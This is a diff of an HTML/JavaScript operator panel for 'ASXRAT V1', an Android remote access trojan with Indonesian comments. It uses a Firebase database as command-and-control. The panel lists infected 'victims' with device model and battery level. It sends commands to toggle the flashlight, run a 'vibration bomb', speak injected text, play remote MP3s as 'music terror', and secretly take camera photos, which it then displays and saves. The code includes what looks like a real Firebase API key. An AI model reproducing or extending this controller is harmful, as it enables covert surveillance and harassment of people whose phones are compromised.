@@ -1,58 +1,41 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ASXRAT V1 | COMMANDER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         :root { --neon: #00f2ff; --bg: #050505; --card: #111; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', Courier, monospace; margin: 0; overflow-x: hidden; }
-
-        /* --- HALAMAN 1: DAFTAR HP --- */
-        #page-list { padding: 20px; display: block; }
-        .title { text-align: center; color: var(--neon); text-shadow: 0 0 10px var(--neon); margin-bottom: 30px; }
-        .device-box { 
-            background: var(--card); border: 1px solid #333; padding: 20px; border-radius: 8px; 
-            margin-bottom: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center;
-            transition: 0.3s;
-        }
-        .device-box:hover { border-color: var(--neon); background: #1a1a1a; }
-        .online-tag { color: #0f0; font-size: 12px; font-weight: bold; text-transform: uppercase; }
-
-        /* --- HALAMAN 2: DASHBOARD CONTROL --- */
-        #page-control { display: none; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
         
-        /* HEADER CONTROL */
-        .control-header { 
-            background: var(--card); padding: 15px; border-bottom: 1px solid var(--neon); 
-            display: flex; align-items: center; position: fixed; top: 0; width: 100%; z-index: 100;
-        }
-        .btn-drawer { background: none; border: 1px solid var(--neon); color: var(--neon); padding: 8px 15px; cursor: pointer; margin-right: 15px; }
+        /* PAGE 1: LIST TARGET */
+        #page-list { padding: 20px; }
+        .device-card { background: var(--card); border: 1px solid #333; padding: 20px; border-radius: 12px; margin-bottom: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; border-left: 5px solid var(--neon); }
 
-        /* DRAWER */
-        .drawer { 
-            position: fixed; top: 0; left: -280px; width: 250px; height: 100%; 
-            background: #000; border-right: 1px solid var(--neon); transition: 0.4s; z-index: 200; padding: 20px;
-        }
+        /* HEADER */
+        .header { position: fixed; top: 0; width: 100%; background: #000; border-bottom: 1px solid var(--neon); padding: 15px; z-index: 100; display: flex; align-items: center; box-sizing: border-box; }
+        
+        /* DRAWER AS REMOTE CONTROL */
+        .drawer { position: fixed; top: 0; left: -300px; width: 290px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.4s; z-index: 200; padding: 20px; box-sizing: border-box; }
         .drawer.active { left: 0; }
-        .drawer h3 { color: var(--neon); border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .menu-item { padding: 15px 0; border-bottom: 1px solid #222; cursor: pointer; transition: 0.2s; }
-        .menu-item:hover { color: var(--neon); padding-left: 10px; }
+        .drawer h3 { color: var(--neon); text-align: center; border-bottom: 1px solid #333; padding-bottom: 10px; }
 
-        /* CONTENT */
-        .main-content { padding: 100px 20px 20px 20px; text-align: center; }
-        .panel { background: var(--card); padding: 20px; border-radius: 10px; border: 1px solid #222; display: none; }
-        .panel.active { display: block; }
+        /* ITEM DI DRAWER */
+        .menu-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; background: #1a1a1a; padding: 10px; border-radius: 8px; }
+        .menu-row span { font-size: 13px; font-weight: bold; color: #aaa; }
         
-        .btn { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        .btn-green { background: #0f0; color: #000; }
-        .btn-red { background: #f00; color: #fff; }
-        .btn-neon { background: var(--neon); color: #000; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; box-sizing: border-box; }
-        img { width: 100%; border: 1px solid var(--neon); margin-top: 15px; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; z-index: 150; }
+        .btn-small { padding: 8px 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px; }
+        .btn-on { background: #0f0; color: #000; margin-right: 5px; }
+        .btn-off { background: #f00; color: #fff; }
+        .btn-blue { background: var(--neon); color: #000; width: 100%; margin-top: 5px; }
+
+        /* MAIN PANEL (BUAT FOTO & INFO) */
+        .main-content { padding: 80px 20px 20px 20px; text-align: center; }
+        .panel-foto { background: var(--card); border: 1px solid #333; border-radius: 15px; padding: 20px; margin-top: 20px; }
+        input { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: #fff; border-radius: 5px; margin-bottom: 5px; box-sizing: border-box; }
+        img { width: 100%; border-radius: 10px; border: 1px solid var(--neon); margin-top: 15px; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; z-index: 150; }
         .overlay.active { display: block; }
     </style>
 </head>
@@ -61,69 +44,70 @@
     <div class="overlay" id="overlay" onclick="toggleDrawer()"></div>
 
     <div id="page-list">
-        <h1 class="title">ASXRAT V1 | VICTIM LIST</h1>
-        <div id="targetList">Scanning for active devices...</div>
+        <h1 style="color:var(--neon); text-align:center;">ASXRAT | VICTIMS</h1>
+        <div id="targetList">Scanning...</div>
     </div>
 
-    <div id="page-control">
-        <div class="control-header">
-            <button class="btn-drawer" onclick="toggleDrawer()">☰ MENU</button>
-            <span id="activeDeviceName" style="font-weight: bold; color: var(--neon);">Device Name</span>
-            <button onclick="exitControl()" style="margin-left: auto; background: red; color: white; border: none; padding: 5px 10px; border-radius: 4px;">EXIT</button>
+    <div id="page-control" style="display:none;">
+        <div class="header">
+            <button onclick="toggleDrawer()" style="background:var(--neon); border:none; padding:10px; font-weight:bold; border-radius:5px;">☰ REMOTE</button>
+            <span id="activeName" style="margin-left:15px; color:var(--neon); font-weight:bold;"></span>
+            <button onclick="location.reload()" style="margin-left:auto; background:red; border:none; color:white; padding:10px; border-radius:5px;">KELUAR</button>
         </div>
 
         <div class="drawer" id="drawer">
-            <h3>COMMANDS</h3>
-            <div class="menu-item" onclick="openPanel('p-info')">📊 Device Info</div>
-            <div class="menu-item" onclick="openPanel('p-flash')">🔦 Senter (Flash)</div>
-            <div class="menu-item" onclick="openPanel('p-voice')">📢 Kirim Suara</div>
-            <div class="menu-item" onclick="openPanel('p-music')">🎵 Play Musik</div>
-            <div class="menu-item" onclick="openPanel('p-snap')">📸 Snap Kamera</div>
-            <div class="menu-item" onclick="openPanel('p-vbt')">📳 Bom Getar</div>
+            <h3>REMOTE CONTROL</h3>
+            
+            <div class="menu-row">
+                <span>SENTER</span>
+                <div>
+                    <button class="btn-small btn-on" onclick="cmd('flash','on')">ON</button>
+                    <button class="btn-small btn-off" onclick="cmd('flash','off')">OFF</button>
+                </div>
+            </div>
+
+            <div class="menu-row">
+                <span>GETAR</span>
+                <div>
+                    <button class="btn-small btn-on" onclick="cmd('vbt_on')">BOM</button>
+                    <button class="btn-small btn-off" onclick="cmd('vbt_off')">OFF</button>
+                </div>
+            </div>
+
+            <div style="background:#1a1a1a; padding:10px; border-radius:8px; margin-bottom:20px;">
+                <span style="font-size:12px; color:#888;">KIRIM SUARA</span>
+                <input type="text" id="vT" placeholder="Tulis sesuatu...">
+                <button class="btn-small btn-blue" onclick="speak()">KIRIM SKRG</button>
+            </div>
+
+            <div style="background:#1a1a1a; padding:10px; border-radius:8px; margin-bottom:20px;">
+                <span style="font-size:12px; color:#888;">MUSIK MP3</span>
+                <input type="text" id="mT" placeholder="Link MP3">
+                <button class="btn-small btn-on" style="width:48%" onclick="playM()">PLAY</button>
+                <button class="btn-small btn-off" style="width:48%" onclick="cmd('stop_music')">STOP</button>
+            </div>
+
+            <p style="text-align:center; font-size:10px; color:#444;">ASXRAT V1 BY MARIO</p>
         </div>
 
         <div class="main-content">
-            <div id="p-info" class="panel active">
-                <h2 id="det-model">Target Model</h2>
-                <p id="det-batt">Battery: --</p>
-                <p id="det-id">ID: --</p>
+            <div id="statusInfo" style="background:#111; padding:15px; border-radius:10px; border:1px solid #222;">
+                <h2 id="dispModel" style="margin:0; color:var(--neon);">--</h2>
+                <p id="dispBatt" style="margin:5px 0 0 0; color:#0f0;">Battery: --</p>
             </div>
 
-            <div id="p-flash" class="panel">
-                <h3>FLASH CONTROL</h3>
-                <button class="btn btn-green" onclick="cmd('flash','on')">SENTER ON</button>
-                <button class="btn btn-red" onclick="cmd('flash','off')">SENTER OFF</button>
-            </div>
-
-            <div id="p-voice" class="panel">
-                <h3>VOICE MESSENGER</h3>
-                <input type="text" id="vText" placeholder="Ketik kata-kata...">
-                <button class="btn btn-neon" onclick="speak()">KIRIM SUARA</button>
-            </div>
-
-            <div id="p-music" class="panel">
-                <h3>MUSIC TERROR</h3>
-                <input type="text" id="mUrl" placeholder="Link Direct MP3">
-                <button class="btn btn-green" onclick="playM()">PLAY MUSIC</button>
-                <button class="btn btn-red" onclick="cmd('stop_music')">STOP MUSIC</button>
-            </div>
-
-            <div id="p-snap" class="panel">
-                <h3>CAMERA SNAPER</h3>
-                <button class="btn btn-neon" onclick="cmd('snap')">AMBIL FOTO</button>
-                <div id="snapResult"></div>
-            </div>
-
-            <div id="p-vbt" class="panel">
-                <h3>VIBRATION ATTACK</h3>
-                <button class="btn btn-red" onclick="cmd('vbt_on')">BOM GETAR ON</button>
-                <button class="btn btn-neon" onclick="cmd('vbt_off')">MATIKAN GETAR</button>
+            <div class="panel-foto">
+                <h3>📷 PANEL KAMERA</h3>
+                <button class="btn-small btn-blue" style="padding:15px; font-size:14px;" onclick="cmd('snap')">AMBIL FOTO SEKARANG</button>
+                <div id="photoArea">
+                    <p style="color:#444; margin-top:20px;">Belum ada foto diambil.</p>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // --- CONFIG FIREBASE (PASTE PUNYA LO) ---
+        // --- PASTE FIREBASE CONFIG LO DISINI ---
         const firebaseConfig = {
             apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
             authDomain: "control-rat.firebaseapp.com",
@@ -137,45 +121,28 @@
         const db = firebase.database();
         let selectedID = "";
 
-        // --- FETCH DAFTAR NAMA HP ---
+        // TAMPILIN DAFTAR HP
         db.ref('targets').on('value', (s) => {
             const list = document.getElementById('targetList');
             list.innerHTML = "";
-            if(!s.exists()) { list.innerHTML = "<p>No victims online...</p>"; return; }
-
             s.forEach(child => {
-                const id = child.key;
-                const data = child.val();
-                list.innerHTML += `
-                <div class="device-box" onclick="enterControl('${id}', '${data.model}')">
-                    <span>📱 ${data.model}</span>
-                    <span class="online-tag">Online</span>
-                </div>`;
-
-                // Update data real-time kalo lagi di dalem control
+                const id = child.key; const d = child.val();
+                list.innerHTML += `<div class="device-card" onclick="openControl('${id}','${d.model}')">
+                    <span>📱 <b>${d.model}</b></span><span style="color:#0f0; font-size:10px;">● ONLINE</span></div>`;
+                
                 if(id === selectedID) {
-                    document.getElementById('det-batt').innerText = "Battery: " + (data.battery || "??") + " (" + (data.charging || "-") + ")";
-                    if(data.foto) {
-                        document.getElementById('snapResult').innerHTML = `<img src="${data.foto}"><br><a href="${data.foto}" download><button class="btn btn-neon">SAVE IMAGE</button></a>`;
-                    }
+                    document.getElementById('dispBatt').innerText = "Battery: " + (d.battery || "??");
+                    if(d.foto) document.getElementById('photoArea').innerHTML = `<img src="${d.foto}"><br><a href="${d.foto}" download="ASX.jpg"><button class="btn-blue" style="padding:10px; margin-top:10px; border:none; border-radius:5px;">SIMPAN KE GALERI</button></a>`;
                 }
             });
         });
 
-        // --- NAVIGATION LOGIC ---
-        function enterControl(id, model) {
+        function openControl(id, model) {
             selectedID = id;
             document.getElementById('page-list').style.display = 'none';
             document.getElementById('page-control').style.display = 'block';
-            document.getElementById('activeDeviceName').innerText = model;
-            document.getElementById('det-model').innerText = model;
-            document.getElementById('det-id').innerText = "ID: " + id;
-        }
-
-        function exitControl() {
-            selectedID = "";
-            document.getElementById('page-list').style.display = 'block';
-            document.getElementById('page-control').style.display = 'none';
+            document.getElementById('activeName').innerText = model;
+            document.getElementById('dispModel').innerText = model;
         }
 
         function toggleDrawer() {
@@ -183,27 +150,17 @@
             document.getElementById('overlay').classList.toggle('active');
         }
 
-        function openPanel(panelId) {
-            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-            document.getElementById(panelId).classList.add('active');
-            toggleDrawer(); // Tutup drawer abis pilih menu
+        // FUNGSI PERINTAH
+        function cmd(type, stat='') { db.ref('commands/'+selectedID).push({type: type, status: stat}); }
+        function speak() { 
+            const t = document.getElementById('vT').value; 
+            db.ref('commands/'+selectedID).push({type:'speak', text:t || "Dongo"}); 
+            document.getElementById('vT').value = ""; // Clear input abis kirim
         }
-
-        // --- COMMAND LOGIC (PUSH SYSTEM) ---
-        function cmd(type, stat = '') {
-            if(!selectedID) return;
-            db.ref('commands/' + selectedID).push({ type: type, status: stat });
-        }
-
-        function speak() {
-            const txt = document.getElementById('vText').value;
-            db.ref('commands/' + selectedID).push({ type: "speak", text: txt || "Dongo" });
-        }
-
-        function playM() {
-            const url = document.getElementById('mUrl').value;
-            db.ref('commands/' + selectedID).push({ type: "play_music", url: url });
+        function playM() { 
+            const u = document.getElementById('mT').value; 
+            db.ref('commands/'+selectedID).push({type:'play_music', url:u}); 
         }
     </script>
 </body>
-</html>
+    </html>
